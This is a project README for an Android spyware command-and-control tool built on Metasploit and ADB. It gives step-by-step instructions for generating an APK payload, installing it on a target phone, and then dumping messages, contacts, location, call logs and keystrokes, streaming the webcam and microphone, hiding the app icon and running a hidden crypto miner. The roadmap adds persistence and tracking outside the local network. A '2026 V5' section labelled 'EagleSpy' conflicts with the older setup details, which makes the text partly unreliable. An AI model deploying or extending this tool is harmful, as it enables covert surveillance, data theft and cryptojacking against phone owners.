[![Rails][rails-shield]][rails-url]
[![Contributors][contributors-shield]][contributors-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]



<!-- PROJECT LOGO -->
<br />
<p align="center">
  <a href="https://github.com/CanciuCostin/android-spyware">
    <img src="images/logo.png" alt="Logo" width="80" height="80">
  </a>

  <h3 align="center">Android Spyware (V5 Modernized)</h3>

  <p align="center">
    <b>Now with Dark Mode, Live Audio, and Docker Optimization</b><br/>
    <a href="https://github.com/CanciuCostin/android-spyware/issues">Report Bug</a>
    ·
    <a href="https://github.com/CanciuCostin/android-spyware/issues">Request Feature</a>
  </p>
</p>

## 🚀 V5 Modernization Update (2026)
This project has been heavily refactored and modernized. Key improvements:

*   **Security Hardening**: Fixed critical vulnerabilities (SQL injection, path traversal, default credentials).
*   **Command Center**: Redesigned dashboard for faster access to core actions.
*   **Live Audio/Video**: Improved WebRTC streaming with TURN server support.
*   **Keylogger 2.0**: Persistent storage, sensitive field detection, and advanced analytics.
*   **Map Visualization**: Real-time Google Maps integration with path tracking.
*   **Docker Optimization**: 50% smaller images using multi-stage builds.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        EagleSpy V5 Architecture                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Android Device              Rails Backend           Admin Browser   │
│  ┌──────────┐     WebSocket  ┌──────────────┐  HTTP  ┌──────────┐  │
│  │ APK      │◄──────────────►│ ActionCable  │◄──────►│ Dashboard│  │
│  │ Client   │  CommandChannel│ Channels     │        │ (Admin)  │  │
│  └────┬─────┘                ├──────────────┤        └────┬─────┘  │
│       │                      │ REST API     │             │        │
│       │  REST (uploads)      │ /api/*       │◄────────────┘        │
│       │─────────────────────►│              │                      │
│       │                      ├──────────────┤                      │
│       │                      │ Services     │                      │
│       │  WebRTC (P2P media)  │ - Response   │                      │
│       │◄─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─►│
│       │                      │   Processor  │                      │
│       │                      │ - Command    │                      │
│       │                      │   Sender     │                      │
│       │                      │ - Heartbeat  │                      │
│       │                      │   Monitor    │                      │
│       │                      └──────┬───────┘                      │
│       │                             │                              │
│       │                     ┌───────┴───────┐                      │
│       │                     │  PostgreSQL   │                      │
│       │                     │  Redis        │                      │
│       │                     │  Metasploit   │                      │
│       │                     │  coturn(TURN) │                      │
│       │                     │  Jaeger       │                      │
│       │                     └───────────────┘                      │
└─────────────────────────────────────────────────────────────────────┘
```

## API Overview

| Category         | Endpoints                           | Auth              |
|------------------|-------------------------------------|-------------------|
| Health           | `/health`, `/health/ready`, `/live` | None              |
| Device Config    | `/api/config`                       | Device Token      |
| Commands         | `/api/commands/{id}/*`              | Device Token      |
| Data Ingestion   | `/api/sms`, `/api/contacts`, etc.   | Device Token      |
| Keylogger        | `/api/keylogger/*`                  | Device Token/Session |
| File Browser     | `/api/smartphones/{id}/files/*`     | Session Cookie    |
| File Transfers   | `/file_transfers/*`                 | Session Cookie    |
| WebRTC           | `/webrtc/*`                         | Session Cookie    |
| Telemetry        | `/api/v1/telemetry/*`               | Session Cookie    |
| GraphQL          | `/graphql`                          | Session Cookie    |

Full API docs: [`docs/api/README.md`](docs/api/README.md) |
OpenAPI spec: [`docs/api/openapi.yaml`](docs/api/openapi.yaml)

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [API Guide](docs/api/README.md) | REST, WebSocket, and GraphQL API reference |
| [OpenAPI Spec](docs/api/openapi.yaml) | Machine-readable API specification |
| [Architecture Decision Records](docs/adr/) | Design decisions and rationale |
| [Deployment Runbook](docs/runbooks/deployment.md) | Step-by-step deployment guide |
| [Incident Response](docs/runbooks/incident-response.md) | What to do when things break |
| [Database Maintenance](docs/runbooks/database-maintenance.md) | Backup, restore, migrations |
| [Scaling Guide](docs/runbooks/scaling.md) | How to scale services |
| [Troubleshooting](docs/runbooks/troubleshooting.md) | Common issues and solutions |
| [Security Setup](docs/SECURITY_SETUP.md) | Credential generation and hardening |

### Quick Start (V5)
1.  Copy environment variables: `cp .env.example .env`
2.  **CRITICAL**: Generate secure credentials! See `docs/SECURITY_SETUP.md`.
3.  Build and Run:
    ```sh
    docker-compose build
    docker-compose up -d
    ```
4.  Access Admin UI at `http://localhost:8080/admin`.
    Default user: `admin@eaglespy.local` (Check .env for password)


## Support The Project
I'm already working full time, so there isn't much time left for this project.

- [Support the project on PAYPAL](https://www.paypal.com/paypalme/canciucostin?v=1&utm_source=unp&utm_medium=email&utm_campaign=RT000269&utm_unptid=8179359e-cbd0-11ed-981f-ac1f6bdb081c&ppid=RT000269&cnac=RO&rsta=en_US%28en-RO%29&cust=ZQ79GPJVPJB7L&unptid=8179359e-cbd0-11ed-981f-ac1f6bdb081c&calc=f804341d8e5ec&unp_tpcid=ppme-social-user-profile-created&page=main%3Aemail%3ART000269&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.155.0&xt=104038%2C127632)

- [Support the project on PATREON](https://www.patreon.com/CostinCanciu)

<!-- TABLE OF CONTENTS -->
## Table of Contents

* [About the Project](#about-the-project)
  * [Disclaimer](#disclaimer)
  * [Built With](#built-with)
  * [Features](#features)
  * [Roadmap](#roadmap)
  * [License](#license)
  * [Contact](#contact)
* [Getting Started](#getting-started)
  * [Prerequisites](#prerequisites)
  * [Installation](#installation)
  * [Deployment](#deployment)
  * [Usage](#usage)
  * [Debugging Issues](#debugging-issues)
  * [Build](#build)
* [Dashboard Workflows](#dashboard-workflows)
* [Testing Strategy](#testing-strategy)
* [Automation & CI/CD](#automation--cicd)
* [Security Hardening](#security-hardening)

<!-- ABOUT THE PROJECT -->
## About The Project

[![Dashboard Screen Shot][product-screenshot]](https://github.com/CanciuCostin/android-spyware)

Educational purpose, command & control, web GUI based Android spyware built around Metasploit & ADB.

The tool:
* Uses Docker containers to simulate a Kali Linux environment with the metasploit framework
* Uses RPC calls to communicate with the Metasploit framework API
* Uses ADB to install the payload on the target device & implement additional functionalities (the device must be in the same LAN)

### Disclaimer
This software is for educational purposes only. Using the tool for spying real devices is strictly illegal. USE THE SOFTWARE AT YOUR OWN RISK. THE AUTHOR ASSUMES NO RESPONSIBILITY FOR YOUR USAGE.

We strongly recommend you to have coding and Docker knowledge. Do not hesitate to read the source code and understand the mechanism of the tool.
### Built With
* [Bootstrap](https://getbootstrap.com)
* [JQuery](https://jquery.com)
* [Rails](https://rubyonrails.org/)
* [Metasploit](https://www.metasploit.com/)
* [ActiveAdmin](https://activeadmin.info/)
* [Docker](https://www.docker.com/)
* [Android Debug Bridge](https://developer.android.com/studio/command-line/adb)

### Features

**Available actions using Metasploit framework**

- [x] Dump System Info
- [x] Dump Location
- [x] Live Webcam Stream
- [x] Dump Messages
- [x] Change Audio Mode
- [x] Dump Call Logs
- [x] Dump Local Time
- [x] Microphone Recording - Only working for Android < 9.0
- [x] Unistall App
- [x] List Installed Apps
- [x] Send Message
- [x] Dump Contacts
- [x] Lock/Unlock Screen
- [x] Run Shell Command
- [x] Webcam Snap
- [x] Open App
- [x] Install App
- [x] Device Info
- [x] Hide/Show payload app icon

**Additional actions via ADB**

- [x] ~~Dump Whatsapp conversations from backup DB~~ (disabled for safety reasons)
- [x] Dump Wi-Fi Information
- [x] Screen Snap
- [x] Upload File
- [x] Record Screen
- [x] Pull File
- [x] Start Monero crypto miner in background



<!-- GETTING STARTED -->
## Getting Started

### Prerequisites
- [Docker](https://www.docker.com/products/docker)
- [Chocolatey](https://chocolatey.org/install)

### Installation

1. Install ADB via Chocolatey. From an elevated powershell prompt (Run as administrator):
```
choco install adb --version=1.0.39
```
2. Create a project directory, and download docker-compose file. You can use curl:
```
curl https://raw.githubusercontent.com/CanciuCostin/android-spyware/master/docker/docker-compose.yml -o docker-compose.yml
```
3. Download required images:
```
docker-compose pull
```

### Deployment
1. Start ADB server from a command prompt:
```
adb server
```
2. Optional, set your Google MAPS API Key in docker-compose file for dashboard widget
3. Start the container (inside the project directory):
```
docker-compose up
```
4. Wait for the containers to initialize, and access the application in the browser via http://localhost/admin
The files directory will be created. It will contain the payloads and the actions outputs.
  
### Usage
1. Ensure USB Debugging is enabled on your Android device [tutorial HERE](https://www.embarcadero.com/starthere/xe5/mobdevsetup/android/en/enabling_usb_debugging_on_an_android_device.html)
2. Optional: Plug-in your Android device to the laptop via USB - Otherwise you won't be able to use ADB functions and you will have to install the malware manually
3. Open the rails app in the browser: http://localhost/admin and login. Default credentials:

User: **admin@example.com**

Password: **password**

4. Generate APK
* Check your machine IP address on LAN. For windows you can use
```
ipconfig
```
[![Ipconfig Screen Shot][ipconfig-screenshot]](https://github.com/CanciuCostin/android-spyware)
* Go to Payloads (http://localhost:8080/admin/apk_payloads) and Create New
* Select port 4444, input the machine IP address and give a name for the APK
* The APK payload will be generated in [project path]/files/payloads
5. Install APK
* Go to APK Installations (http://localhost/admin/apk_installations) and Create New
* Select your previously generated apk from the list and leave the target as usb
* You might have to approve a prompt on the device
6. Run Actions
* Go to Remote (http://localhost/admin/remote)
* Open the installed app on your device. You should see green light for your MSF connectivity right after. The ADB should also turn green if your device is plugged via USB
* Run actions by clicking on the app-looking icons on the device widget. The output will be displayed in the terminal widget, and the output will be stored in [project path]/files/dumps
[![Remote Screen Shot][remote-screenshot]](https://github.com/CanciuCostin/android-spyware)
  
### Debugging Issues
**MSF/ADB connection issues (green light not appearing in Remote page)**
* Ensure you generated the apk with correct machine IP
* Ensure connection from smartphone to your machine is not blocked by local firewall. Otherwise you should allow connection on ports 2222, 3333, 4444. 
To check that, you can try to access http://[your machine IP]:2222 . You should be able to access the MSF container file system via http server
* Ensure Docker container - HOST connectivity is working. Host machine is accessed via **gateway.docker.internal**, which is set in docker-compose file. If that doesn't work for you, you can also try to replace it with **docker.host.internal**
* For ADB connection, you can try to restart the local server:
```
adb kill-server
adb server
```
* For ADB connection, ensure USB debugging is enabled

### Build

**Software requirements**
- [Docker](https://www.docker.com/products/docker)
- [NodeJS & npm](https://nodejs.org/en/download/)
- [Ruby 2.6.6](https://rubyinstaller.org/downloads/archives/)

Rails Server build steps:
```
git clone https://github.com/CanciuCostin/android-spyware.git
cd android-spyware
gem install bundler:2.1.4
bundle
npm install yarn -g
yarn install --check-files
```
Ensure the following environment variables are set:
```
ANDROIDSPYWARE_DATABASE_HOST=localhost
ADB_HOST=localhost
RAILS_HOST=127.0.0.1
```
Run the server:
```
rails server
```
* Note: local postgresql database can also be used as alternative, but you will need to run the rake scripts for initialization:
```
rake db:create //alternatively run createdb android_spyware_[developmen|test|production]
rake db:schema:load
rake db:seed /too add mock data required for start-up
```
## Dashboard Workflows

The redesigned Command Center aggregates device health, live streaming, and action panels into a single dashboard curated for triage and command delivery. The **Device Grid** keeps the fleet status summarized, the **Live Activity Board** highlights recent data and alerts, and the **Action Panel** lets operators dispatch Metasploit or ADB commands while watching streamed feedback in the **Terminal Widget**.

```
[Device Grid] --> [Live Activity Board] --> [Action Panel] --> [Terminal Widget]
```

See `docs/DASHBOARD_AUTOMATION_OVERVIEW.md` for a deeper workflow map and reference summaries.

## Testing Strategy

Our automated test matrix couples RSpec models with Capybara suites so every release exercises device proxies, APIs, and the web UI before it can land. Run `bundle exec rspec` locally and rely on the same suites in GitHub Actions, which capture HTML reports, coverage artifacts, and terminal logs for traceability.

```
[Spec Matrix] --> [RSpec + Capybara Jobs] --> [GitHub Actions Artifact Store]
```

## Automation & CI/CD

CI/CD is powered by GitHub Actions: dependency install, lint, and spec jobs gate merges while container builds, security scans, and optional artifact uploads prepare releases. Any pipeline failure halts deployment, and `docs/DASHBOARD_AUTOMATION_OVERVIEW.md` lists the job stages, triggers, and notification targets for transparency.

```
[Push | PR] --> [Install Dependencies] --> [Lint + Specs] --> [Docker Build + Scan] --> [Deploy/Notify]
```

## Security Hardening

Security is layered: regenerate credentials per `docs/SECURITY_SETUP.md`, lock down exposed ports, enforce TLS, and rely on Rack::Attack for rate limiting. This doc also tracks the audit log policy and nightly scans so teams can confirm `SECRET_KEY_BASE`, `TURN_PASSWORD`, and other secrets rotate before deployment.

For the full checklist, review `docs/SECURITY_SETUP.md`.

## Roadmap
- [ ] Implement "Instructions" page
- [ ] Implement option for persistence script (connection is lost after reboot)
- [ ] Implement option for public IP handler (either ngrok or cloud solution) to be able to track device outside of LAN

## License
Distributed under the MIT License. See `LICENSE` for more information.

<!-- CONTACT -->
## Contact
costin.canciu@gmail.com

<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[rails-shield]: https://img.shields.io/badge/rails-v6.0.2.2-green
[rails-url]: https://github.com/CanciuCostin/android-spyware/graphs/contributors
[contributors-shield]: https://img.shields.io/github/contributors/CanciuCostin/android-spyware.svg?style=flat-square
[contributors-url]: https://github.com/CanciuCostin/android-spyware/graphs/contributors
[issues-shield]: https://img.shields.io/github/issues/CanciuCostin/android-spyware.svg?style=flat-square
[issues-url]: https://github.com/CanciuCostin/android-spyware/issues
[license-shield]: https://img.shields.io/github/license/othneildrew/Best-README-Template.svg?style=flat-square
[license-url]: https://github.com/CanciuCostin/android-spyware/blob/master/LICENSE.md
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=flat-square&logo=linkedin&colorB=555
[linkedin-url]: https://ro.linkedin.com/in/costin-canciu-b3572a105
[product-screenshot]: images/dashboard.png
[remote-screenshot]: images/remote.png
[ipconfig-screenshot]: images/ipconfig.PNG
